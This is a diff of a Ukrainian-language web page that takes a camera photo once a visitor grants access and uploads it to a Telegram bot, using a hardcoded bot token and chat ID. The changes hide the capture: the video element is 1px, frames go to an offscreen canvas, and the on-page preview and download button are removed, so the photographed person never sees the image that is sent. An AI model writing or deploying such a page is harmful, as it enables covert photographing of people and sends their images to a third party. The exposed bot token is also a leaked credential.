@@ -2,19 +2,20 @@
 <html lang="uk">
 <head>
   <meta charset="utf-8" />
-  <title>AutoSelfie → Telegram (без логів, з картинкою)</title>
+  <title>AutoSelfie → Telegram (статична картинка зверху)</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
     :root{--bg:#0f1720;--card:#0b1220;--accent:#2563eb;--muted:#9fb0c8;--text:#e6eef8}
     html,body{height:100%;margin:0}
     body{font-family:system-ui,Segoe UI,Roboto,Arial;background:var(--bg);color:var(--text);display:flex;align-items:flex-start;justify-content:center;padding:20px}
     .card{background:var(--card);border:1px solid #1f2a3a;padding:18px;border-radius:12px;max-width:820px;width:100%;box-sizing:border-box}
-    h2{margin:0 0 12px 0}
-    p.note{margin:0 0 14px 0;color:var(--muted);font-size:14px}
+    header{display:flex;align-items:center;gap:12px;margin-bottom:12px}
+    header img{max-height:72px;border-radius:8px;object-fit:contain}
+    h2{margin:0;font-size:20px}
+    p.note{margin:6px 0 14px 0;color:var(--muted);font-size:14px}
     .controls{display:flex;gap:10px;align-items:center;margin-bottom:12px}
     button{padding:10px 14px;border-radius:8px;border:none;background:var(--accent);color:#fff;font-size:15px;cursor:pointer}
     button:disabled{opacity:.6;cursor:default}
-    canvas{width:100%;max-width:480px;border-radius:8px;background:#000;display:block}
     /* Відео має бути рендереним — мінімізуємо його розмір, але не ховаємо display:none */
     video{position:fixed;left:0;top:0;width:1px;height:1px;z-index:-1;background:#000}
     .small-note{font-size:13px;color:var(--muted);margin-top:8px}
@@ -22,43 +23,47 @@
 </head>
 <body>
   <div class="card">
-    <h2>Автоселфі → Telegram</h2>
-    <p class="note">Натисни «Надати доступ», дозволь камеру. Фото зробиться автоматично і надійде в Telegram. Якщо хочеш — в HTML можна вставити картинку (логотип/водяний знак) — дивись змінну <code>IMAGE_SRC</code> у скрипті.</p>
+    <!-- Статична картинка зверху: змінюй IMAGE_SRC у скрипті або тут -->
+    <header>
+      <img id="topImage" alt="Статична картинка" src="" />
+      <div>
+        <h2>Автоселфі → Telegram</h2>
+        <p class="note">Натисни «Надати доступ», дозволь камеру. Фото зробиться автоматично і надійде в Telegram. Зняте фото не відображається на сторінці.</p>
+      </div>
+    </header>
 
     <div class="controls">
       <button id="grantBtn">Надати доступ до камери</button>
-      <button id="downloadBtn" style="display:none">Завантажити фото</button>
-      <div class="small-note">Картинка з HTML (опціонально) буде накладена на фото</div>
+      <div class="small-note">Сторінка працює тільки через HTTPS або localhost.</div>
     </div>
 
-    <!-- Прихований відеоелемент потрібен для зйомки кадру -->
+    <!-- Прихований відеоелемент потрібен для зйомки кадру (не показуємо фото після зйомки) -->
     <video id="video" autoplay playsinline muted></video>
 
-    <div>
-      <canvas id="canvas"></canvas>
-    </div>
-
-    <p class="small-note">Сторінка працює тільки через HTTPS або localhost. Якщо Telegram не приймає фото через браузер (CORS), повідом мене — дам простий proxy.</p>
+    <p class="small-note">Якщо відправка в Telegram не проходить (помилка fetch/CORS), повідом — дам простий proxy.</p>
   </div>
 
   <script>
     // ====== Налаштування (встав свої дані сюди) ======
     const BOT_TOKEN = "8506109550:AAGjHAChPn0IFIdL24s9PauJfwk9F9mV-_Y";
     const CHAT_ID = "1178810140";
-    // IMAGE_SRC може бути URL або data URI; якщо порожній — накладання не виконується
-    // Приклад: const IMAGE_SRC = "https://example.com/logo.png";
-    // Або: const IMAGE_SRC = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA...";
-    const IMAGE_SRC = "";
-    // Розмір накладки у відсотках від ширини фото (наприклад 20 = 20%)
-    const OVERLAY_WIDTH_PCT = 20;
-    // Позиція накладки: 'top-left','top-right','bottom-left','bottom-right'
-    const OVERLAY_POSITION = 'top-right';
+    // Статична картинка зверху: можна вставити URL або data URI
+    // Приклад: "https://example.com/logo.png" або "data:image/png;base64,..."
+    const IMAGE_SRC = ""; // <-- ВСТАВ СЮДИ ШЛЯХ ДО КАРТИНКИ
+    // Накладка на фото не потрібна — ми просто показуємо картинку зверху статично.
     // ================================================
 
     const grantBtn = document.getElementById('grantBtn');
-    const downloadBtn = document.getElementById('downloadBtn');
     const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+    const topImage = document.getElementById('topImage');
+
+    // Встановлюємо статичну картинку (якщо вказано)
+    if (IMAGE_SRC) {
+      topImage.src = IMAGE_SRC;
+    } else {
+      // Якщо IMAGE_SRC порожній — приховаємо елемент, щоб не було пустого місця
+      topImage.style.display = 'none';
+    }
 
     function isSecure(){
       return location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
@@ -70,6 +75,7 @@
       video.srcObject = null;
     }
 
+    // Надійне очікування першого відрендереного кадру
     function waitForVideoFrameReady(videoEl, timeout = 4000) {
       return new Promise((resolve, reject) => {
         const start = Date.now();
@@ -90,79 +96,40 @@
       });
     }
 
-    async function drawAndSend(stream) {
-      try {
-        // Підбираємо розміри canvas
-        const w = video.videoWidth || 640;
-        const h = video.videoHeight || 480;
-        canvas.width = w;
-        canvas.height = h;
-        const ctx = canvas.getContext('2d');
+    // Використовуємо offscreen (невидимий) canvas — не додаємо його в DOM
+    function createOffscreenCanvas(w, h) {
+      const c = document.createElement('canvas');
+      c.width = w;
+      c.height = h;
+      return c;
+    }
 
-        // Малюємо кадр з відео
-        ctx.drawImage(video, 0, 0, w, h);
+    async function captureAndSend() {
+      // Підбираємо розміри canvas відповідно до відео
+      const w = video.videoWidth || 640;
+      const h = video.videoHeight || 480;
+      const canvas = createOffscreenCanvas(w, h);
+      const ctx = canvas.getContext('2d');
 
-        // Якщо задано IMAGE_SRC — накладаємо картинку
-        if (IMAGE_SRC) {
-          try {
-            const img = new Image();
-            // Щоб уникнути CORS проблем при завантаженні зовнішніх зображень,
-            // краще використовувати data URI або зображення з того ж походження.
-            img.crossOrigin = "anonymous";
-            await new Promise((resolve, reject) => {
-              img.onload = resolve;
-              img.onerror = reject;
-              img.src = IMAGE_SRC;
-            });
+      // Малюємо кадр з відео
+      ctx.drawImage(video, 0, 0, w, h);
 
-            // Розрахунок розміру накладки
-            const overlayW = Math.round(w * (OVERLAY_WIDTH_PCT / 100));
-            const scale = overlayW / img.width;
-            const overlayH = Math.round(img.height * scale);
+      // Отримуємо Blob (PNG)
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+      if (!blob) throw new Error('toBlob returned null');
 
-            let x = 0, y = 0;
-            if (OVERLAY_POSITION.includes('right')) x = w - overlayW - 8;
-            else x = 8;
-            if (OVERLAY_POSITION.includes('bottom')) y = h - overlayH - 8;
-            else y = 8;
+      // Формуємо FormData для Telegram
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('photo', blob, 'selfie.png');
 
-            ctx.globalAlpha = 0.95;
-            ctx.drawImage(img, x, y, overlayW, overlayH);
-            ctx.globalAlpha = 1;
-          } catch (e) {
-            // Якщо накладка не завантажилась — ігноруємо
-            console.warn('Overlay image load failed', e);
-          }
-        }
-
-        // Показати кнопку завантаження локально
-        downloadBtn.style.display = 'inline-block';
-
-        // Отримуємо Blob
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
-        if (!blob) {
-          alert('Не вдалося сформувати зображення.');
-          return;
-        }
-
-        // Відправка в Telegram
-        const form = new FormData();
-        form.append('chat_id', CHAT_ID);
-        form.append('photo', blob, 'selfie.png');
-
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-        // Пряма відправка; якщо браузер блокує через CORS, потрібен proxy
-        const resp = await fetch(url, { method: 'POST', body: form });
-        if (!resp.ok) {
-          // Якщо помилка — показуємо повідомлення, але фото вже видно на canvas
-          alert('Відправка неуспішна. Можлива проблема з CORS або токен/чат невірні.');
-        } else {
-          alert('Фото відправлено в Telegram.');
-        }
-      } catch (err) {
-        console.error(err);
-        alert('Помилка при формуванні або відправці фото. Перевір консоль.');
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+      const resp = await fetch(url, { method: 'POST', body: form });
+      if (!resp.ok) {
+        const text = await resp.text().catch(()=>'[no body]');
+        throw new Error('Telegram API error: ' + resp.status + ' ' + text);
       }
+      return true;
     }
 
     grantBtn.addEventListener('click', async () => {
@@ -177,33 +144,20 @@
         video.srcObject = stream;
         try { await video.play(); } catch(e){ /* ignore */ }
         await waitForVideoFrameReady(video, 5000);
-        // Додаткова пауза для автоекспозиції/фокусу
+        // Коротка пауза для автоекспозиції/фокусу
         await new Promise(r => setTimeout(r, 400));
-        await drawAndSend(stream);
-      } catch (e) {
-        console.error(e);
-        alert('Не вдалося отримати кадр з камери. Спробуй ще раз або перевір дозволи.');
+        await captureAndSend();
+        alert('Фото зроблено і надіслано в Telegram.');
+      } catch (err) {
+        console.error(err);
+        // Користувачу — коротке повідомлення
+        alert('Не вдалося зробити або відправити фото. Перевір дозволи, токен/чат або CORS.');
       } finally {
         await stopStream(stream);
         grantBtn.disabled = false;
       }
     });
-
-    // Кнопка для локального завантаження останнього кадру
-    downloadBtn.addEventListener('click', () => {
-      try {
-        const dataUrl = canvas.toDataURL('image/png');
-        const a = document.createElement('a');
-        a.href = dataUrl;
-        a.download = 'selfie.png';
-        document.body.appendChild(a);
-        a.click();
-        a.remove();
-      } catch (e) {
-        console.error(e);
-        alert('Не вдалося завантажити фото.');
-      }
-    });
   </script>
 </body>
-</html>
+  </html>
+            
